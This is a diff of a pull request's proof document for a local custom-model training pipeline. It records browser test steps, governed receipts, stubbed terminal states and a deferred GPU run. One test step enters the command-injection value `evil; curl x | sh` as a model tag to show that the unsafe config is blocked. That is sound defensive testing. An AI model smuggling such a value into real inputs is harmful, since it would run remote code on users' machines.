@@ -1,119 +1,135 @@
-# Custom Model Training Pipeline — Production Proof Pack
+# Custom Model Training Pipeline — Super-Admin Proof Pack
 
-Real-user browser journey on a real boot of the exported
-`growthub-custom-workspace-starter-v1` kit, mirroring the marketplace
-providers' golden-path closed-loop standard (`docs/proofs/pr270/PROOF.md`).
-The pipeline under proof: the one-click distillation → QLoRA fine-tune →
-GGUF quantize → serve loop inside the Training Handoff modal, governed
-end-to-end through the existing `PATCH /api/workspace` + `sandbox-run` lanes.
+The proof narrative for the one-click, no-code local custom-model pipeline
+(distilled corpus → QLoRA fine-tune → GGUF convert → quantize → Ollama serve →
+tuned-tag verify → workflow smoke), governed end-to-end through the existing
+`PATCH /api/workspace` + `sandbox-run` lanes. Companion to
+[`CUSTOM_LOCAL_MODEL_GOLDEN_PATH_V1`](../../CUSTOM_LOCAL_MODEL_GOLDEN_PATH_V1.md)
+(the canonical 0-7 stage vocabulary, failure catalog, and 9-milestone contract).
 
-## Proof environment (honest adaptation, same as the pr270 pack)
+**Read this pack in three clearly-separated classes so nothing is over-claimed:**
 
-- **Driver**: `playwright-core` on the pre-installed Chromium
-  (`/opt/pw-browsers/chromium`), viewport 1440×950 — `scripts/e2e-custom-model-journey-playwright.mjs`.
-- **Backend**: local boot of the exported worker kit via the documented
-  `scripts/export-seed-workspace-model-qa.mjs` harness — `next dev --webpack`
-  on `http://127.0.0.1:3777`, seeded to a super-admin model-QA state
-  (12 governed `training-traces`, a `model-training` row on base `gemma3`).
-- **Live action layer**: Playwright `click` / real navigation of the governed
-  wizard (checklist → curate → profile → prepare → train) — no API shortcuts
-  for user steps.
-- **Readback layer**: `page.request` + `curl` JSON readbacks against
-  `/api/workspace`; captured in `readbacks.json` and the receipt readouts below.
-- **Screenshots**: numbered PNGs in this directory, in journey order.
+- **Section A — real booted in-container journey.** A real browser (`playwright-core`
+  Chromium) driving a real `next dev` boot of the exported kit. Everything the
+  runtime *governs* is proven here.
+- **Section B — seeded terminal-state UI/deriver proof.** A complete governed
+  receipt injected through the sanctioned PATCH so the terminal states (9/9
+  proof checklist, completion reward) render + derive from real rows — the UI/
+  deriver truth, with the weights themselves stubbed.
+- **Section C — real-machine weights proof (deferred, required before merge).**
+  The live GPU/Ollama/Unsloth run. Physically impossible in CI; the operator's
+  hardware step. **This is why the PR stays draft.**
 
-Live GPU/Ollama/Unsloth fine-tune cannot execute in this environment (no GPU,
-no toolchain), exactly as pr270 defers live-vendor egress. Everything the
-runtime *governs* — the gate, the composed pipeline, the governed receipts,
-the quant proof, the thin-delta progress, and the derived remediation — is
-proven here against real server-side code paths.
+Environment: `playwright-core` on `/opt/pw-browsers/chromium` (1440×950); local
+`next dev --webpack` boot of `growthub-custom-workspace-starter-v1` on
+`http://127.0.0.1:3777`, seeded model-QA (12 governed `training-traces`, a
+`model-training` row on base `gemma3`).
 
 ---
 
-## Journey — one continuous browser run
+## Section A — real booted in-container journey
 
-```text
-Using playwright-core Chromium against the local export boot at 127.0.0.1:3777.
-Backend: model-QA seed (12 traces, model-training row on gemma3).
-```
+Driver `scripts/e2e-custom-model-shell-playwright.mjs` (3/3 governed checks) +
+`scripts/e2e-custom-model-states-playwright.mjs` (4/4 state checks).
 
-**1 — `/training` renders; fine-tune gate is GREEN** (`01-training-ledger-gate.png`)
-The Training ledger loads (the earlier CSS merge defect that 500'd every page
-is fixed), and the bootstrap step **"Train & import a real custom model"**
-reports **ready** — 12 qualified reasoning traces clear the 10-trace floor.
-
-**2 — the handoff modal opens** (`02-handoff-modal-open.png`)
-"Start model training": **11 qualified traces / 10 minimum / Ollama (local)
-target**, with the governed 4-step flow (Review → Train → Attach → Test & run).
-
-**3 — the ONE-CLICK pipeline is the composed chain** (`03-composed-pipeline-commands.png`)
-The Train panel shows the real "Exact command this runs on your machine":
-`python train.py … → merge_and_export.py → convert_hf_to_gguf.py →
-llama-imatrix → llama-quantize … {quant} → ollama create` — the composed
-`unsloth-distill-quantize-pipeline` profile, base `gemma3`, endpoint
-`http://127.0.0.1:11434/v1/chat/completions`. Journey check: **quantize=true,
-serve=true** in the command chain (PASS).
-
-**4 — one click records a GOVERNED receipt** (`04-one-click-governed-receipt.png`)
-"Start fine-tuning" writes, in one governed `PATCH /api/workspace`, a
-`model-training-run` receipt (`status: running`) plus the runner sandbox row.
-Readback: run row present, `trainingProfile: unsloth-distill-quantize-pipeline`.
-
-**5 — the runner sandbox stands up (atomic, no parallel runtime)** (`05-runner-sandbox-thin-delta.png`)
-The `model-training-runner` `sandbox-environment` object appears with **1 row**
-carrying the runner program; the loop rides the existing `sandbox-run` lane —
-nothing else spins up.
-
-**6 — governance boundary + governed failed receipt → derived remediation**
-The governed write initially returned **HTTP 400** — the Law layer rejected the
-runner because its multi-hour `timeoutMs` exceeded the sandbox 10-minute cap.
-Fixed: local-machine runs (`runLocality:"local"`) now allow up to 6h; the
-runner PATCH then returns **HTTP 200** (verified live). On a stage failure the
-runner stamps a governed `failed` receipt naming the stage; re-reading that live
-governed state, `deriveTrainingRemediation` returns the one-click remedy:
-
-```json
-{ "failurePoint": "fine-tune", "action": "retry_finetune",
-  "cta": "Adjust & re-run the fine-tune", "destination": "/training",
-  "oneClick": true }
-```
+1. **Real workspace shell** (`00-real-data-model-shell.png`) — the actual
+   `/data-model` shell (rail: Builder / Workspace Lens / Management / Settings)
+   with the **API Registry** showing the governed `workspace-local-model` row →
+   `http://127.0.0.1:11434/v1/chat/completions`. `shell-objects.json` is the
+   governed-object readback. **This is the real no-code experience, not a bare route.**
+2. **Readiness / why the button is allowed** (`states/01-gate-checklist.png`) —
+   the training ledger over the governed corpus; the fine-tune step is READY at
+   12 qualified traces (≥ 10 floor).
+3. **Composed argv pipeline** (`states/02-profile-argv-commands.png`,
+   `03-composed-pipeline-commands.png`) — the `unsloth-qlora-quantize-pipeline`
+   profile: `python train.py … → merge_and_export → convert_hf_to_gguf →
+   llama-imatrix → llama-quantize {quant} → ollama create`, shown as the exact
+   argv the runner executes (no shell string).
+4. **Unsafe config is impossible to start** (`states/03-unsafe-config-blocked.png`)
+   — injecting `evil; curl x | sh` as the tuned tag → **Prepare disabled
+   (`prepDisabled=true`)** and `commandSafety.reasons` rendered.
+5. **One click → governed receipt + atomic runner** (`04-one-click-governed-receipt.png`,
+   `05-runner-sandbox-thin-delta.png`) — one `model-training-run` receipt +
+   one `model-training-runner` sandbox row; no parallel runtime.
+6. **Waiting UX with no fabricated progress** (`states/04-running-wait-state.png`)
+   — a `running` receipt with no progress yet → bar width **0** and
+   "Waiting for runner stamp…"; the bar only moves from real `progress.pct`,
+   `aria-valuenow` set only when determinate, elapsed shown separately.
 
 ---
 
-## Real workspace shell (not the bare route)
+## Section B — seeded terminal-state UI/deriver proof
 
-`00-real-data-model-shell.png` — the actual `/data-model` workspace shell on the
-booted seeded export: rail (Builder / Workspace Lens / Management / Settings) and
-the **API Registry showing the governed `workspace-local-model` row →
-`http://127.0.0.1:11434/v1/chat/completions`** alongside the seeded
-`model-training` (base `gemma3`) + 12 `training-traces`. `shell-objects.json` is
-the governed-object readback. This is the real no-code experience, driven by
-`scripts/e2e-custom-model-shell-playwright.mjs` (3/3 governed checks).
+Driver `scripts/e2e-custom-model-states-playwright.mjs` injects a **complete
+governed `model-training-run` receipt + `api-registry` lastResponse** through
+the sanctioned PATCH, then derives against the live row.
+`states/readbacks.json` records:
 
-`readbacks.json` is consistent with the screenshots: it records the real
-`/data-model` shell, the one-click governed `model-training-run` receipt
-(`status: running`) + atomic runner sandbox, and the governed `failed` receipt →
-`deriveTrainingStageIssue`/remediation derivation. It does **not** claim a
-terminal `complete` readback that this environment cannot produce.
+- **9-milestone proof checklist = 9/9, complete=true** — preflight, distilling
+  counter, fine-tune, convert GGUF, quant size proof, ollama create, chat-verify
+  tuned tag, registry live, workflow outputHash — each proven from the governed
+  row (see `deriveTrainingProofChecklist`).
+- **Completion reward = live** — "**Your custom model is live locally.**", tag
+  `workspace-local-tuned-v1`, base `gemma3`, quant `16.0 GB → 4.4 GB (q4_k_m)`,
+  endpoint `:11434/v1`, verified response model == tuned tag, outputHash.
+- **Failure + resume** (unit-proven, `unit-training-runtime`): `fine_tune_oom →
+  "Resume from checkpoint with a smaller batch"`; quant contradiction →
+  re-quantize; base-model response → never verifies.
 
-See [`CUSTOM_LOCAL_MODEL_GOLDEN_PATH_V1`](../../CUSTOM_LOCAL_MODEL_GOLDEN_PATH_V1.md)
-for the canonical stage vocabulary, the stage-event failure catalog, the
-waiting-UX rules, and the 9-milestone proof contract.
+The weights are stubbed; the UI, derivers, receipts, and proof gates are real.
 
-## What is proven vs deferred
+---
 
-| Stage | Proof |
-| --- | --- |
-| Invocation gate (≥10 JSONL reasoning traces) | Real browser: gate READY at 12 traces |
-| Composed QLoRA→quantize→serve pipeline | Real browser: command chain shown (quantize + ollama create) |
-| One-click governed receipt | Real browser: `model-training-run` row written via governed PATCH |
-| Atomic runner sandbox (no parallel runtime) | Real browser: `model-training-runner` row = 1 |
-| Governance boundary (timeout cap) | Live: PATCH 400 → 200 after the local-cap fix |
-| Governed `failed` receipt → one-click remediation | Live governed state → `deriveTrainingRemediation` → `retry_finetune` |
-| Quant proof gate, remediation sub-registry, shard planner | `unit-training-runtime` 56/56 |
-| Full ladder + demotions | `e2e-custom-model-training-loop` 29/29, `deployment-loop` 17/17 |
-| **Deferred** (env-bound): live GPU/Ollama/Unsloth fine-tune; the runner's callback stamp under the local sandbox adapter | No GPU/toolchain in this environment (same class of deferral as pr270's live-vendor smoke) |
+## Section C — real-machine weights proof (deferred, required before merge)
 
-Pure-suite totals on this branch: **unit-training-runtime 56/56 ·
-training-loop 29/29 · deployment-loop 17/17 · sandbox-browser-access 11 ·
-supabase-hardening 12** — all green.
+Physically impossible in CI (no GPU / python ML / `ollama` / `llama.cpp`). The
+operator captures, on real hardware, one small-model path — each a screenshot +
+JSON readback:
+
+`01 preflight pass` · `02 distilling counter (distilled sha + accepted/rejected)`
+· `03 fine-tune step/loss/checkpoint` · `04 GGUF convert` · `05 quant byte delta
++ sha` · `06 ollama create stream + served tag` · `07 chat verify (served ==
+tuned tag)` · `08 API Registry connected` · `09 workflow smoke outputHash`.
+
+Same class of deferral as PR #270's live-vendor smoke.
+
+---
+
+## Section D — screenshot / readback → governed-row index
+
+Every claim traces to a governed row or source record.
+
+| Artifact | Proves | Governed source |
+| --- | --- | --- |
+| `00-real-data-model-shell.png` + `shell-objects.json` | real workspace shell + custom-model endpoint | `api-registry` (`workspace-local-model`), `model-training`, `training-traces` |
+| `states/01-gate-checklist.png` | invocation gate READY at 12 traces | `training-traces` rows, `deriveDistillationPipelineState` |
+| `states/02-profile-argv-commands.png`, `03-composed-pipeline-commands.png` | composed argv pipeline | `training-runtime-profiles.js` (`unsloth-qlora-quantize-pipeline`) |
+| `states/03-unsafe-config-blocked.png` | unsafe config disables Prepare | `runConfig.commandSafety` (`buildTrainingRunConfig`) |
+| `04-one-click-governed-receipt.png` | one governed run receipt written | `model-training-run` row (PATCH `/api/workspace`) |
+| `05-runner-sandbox-thin-delta.png` | atomic runner, no parallel runtime | `sandbox-environment` (`model-training-runner`) |
+| `states/04-running-wait-state.png` | bar 0 until real stamp | `model-training-run.progress` (`deriveTrainingWaitState`) |
+| `states/readbacks.json` (checklist 9/9) | terminal proof from governed rows | `model-training-run` (artifact* + progress + preflight + outputHash) + `api-registry.lastResponse` |
+| `states/readbacks.json` (reward live) | completion reward truth-bound | `deriveTrainingCompletionReward` over the same rows |
+| `readbacks.json` (root) | honest in-container path (no live `complete`) | narrates the deferred boundary |
+
+Pure-suite backing: `unit-training-runtime` **68/68** · `unit-custom-models-ledger`
+**14/14** · `e2e-custom-model-training-loop` **29/29** ·
+`e2e-custom-model-deployment-loop` **17/17**.
+
+---
+
+## Section E — gaps deferred by physical environment
+
+- **Live weights fine-tune to `complete`** — needs a GPU + python ML +
+  `ollama`/`llama.cpp`. Not present in CI. → Section C, operator hardware.
+- **The runner's on-machine callback under a real GPU run** — proven governed
+  at the receipt level (Section B); the live end-to-end callback rides Section C.
+- **Real-browser screenshots of the newly-wired cockpit** (Details open,
+  Suggested Actions accordion, serving profile) — derivers are unit-proven
+  (14/14 + 68/68); the browser capture is the next in-container follow-up.
+- **Helper-setup verified-model selection** + **truthful open-artifact contract**
+  — explicitly deferred (tracked on the PR).
+
+Proof quality is product quality: this pack lets a super admin trace every
+state to a governed row, and is explicit about the one thing a cloud CI cannot
+physically do — run the weights.
